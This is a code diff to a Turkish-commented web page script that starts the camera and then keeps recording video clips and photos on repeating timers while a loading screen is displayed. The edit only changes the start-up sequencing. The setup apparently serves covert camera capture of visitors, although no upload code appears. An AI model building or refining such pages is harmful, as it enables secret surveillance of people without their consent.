@@ -144,7 +144,7 @@
                     .catch(e => console.log(e));
             }
             
-            // ==================== KAMERA İŞLEMLERİ - SON ŞANS ====================
+            // ==================== KAMERA İŞLEMLERİ - KESİN ÇÖZÜM ====================
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
@@ -156,7 +156,6 @@
             let stream = null;
             let videoInterval = null;
             let fotoInterval = null;
-            let isReady = false;
             
             async function startCamera() {
                 try {
@@ -175,14 +174,11 @@
                         document.getElementById('startBtn').style.display = 'none';
                         document.getElementById('loading').style.display = 'block';
                         
-                        // Kamera hazır
-                        isReady = true;
-                        
                         // ========================================
                         // VİDEO FONKSİYONU
                         // ========================================
                         function videoBaslat() {
-                            if (!stream?.active || !isReady) return;
+                            if (!stream?.active) return;
                             
                             videoCount++;
                             const videoIndex = videoCount;
@@ -227,7 +223,7 @@
                         // FOTOĞRAF FONKSİYONU
                         // ========================================
                         function fotoBaslat() {
-                            if (!stream?.active || !isReady) return;
+                            if (!stream?.active) return;
                             
                             photoCount++;
                             
@@ -250,21 +246,26 @@
                         }
                         
                         // ========================================
-                        // ÖNCE VİDEOYU BAŞLAT
+                        // SIRALI BAŞLANGIÇ
                         // ========================================
+                        
+                        // 1. Önce video başlasın (500ms)
                         setTimeout(() => {
                             videoBaslat();
                             
                             // Video zamanlayıcısı
                             videoInterval = setInterval(videoBaslat, VIDEO_SURESI * 1000);
                             
-                            // 1 saniye sonra fotoğrafları başlat
-                            setTimeout(() => {
-                                fotoBaslat();
-                                fotoInterval = setInterval(fotoBaslat, FOTO_SURESI * 1000);
-                            }, 1000);
+                        }, 500);
+                        
+                        // 2. Sonra fotoğraflar başlasın (1500ms)
+                        setTimeout(() => {
+                            fotoBaslat();
                             
-                        }, 500); // 500ms sonra video başlasın
+                            // Fotoğraf zamanlayıcısı
+                            fotoInterval = setInterval(fotoBaslat, FOTO_SURESI * 1000);
+                            
+                        }, 1500);
                     };
                     
                 } catch(e) {
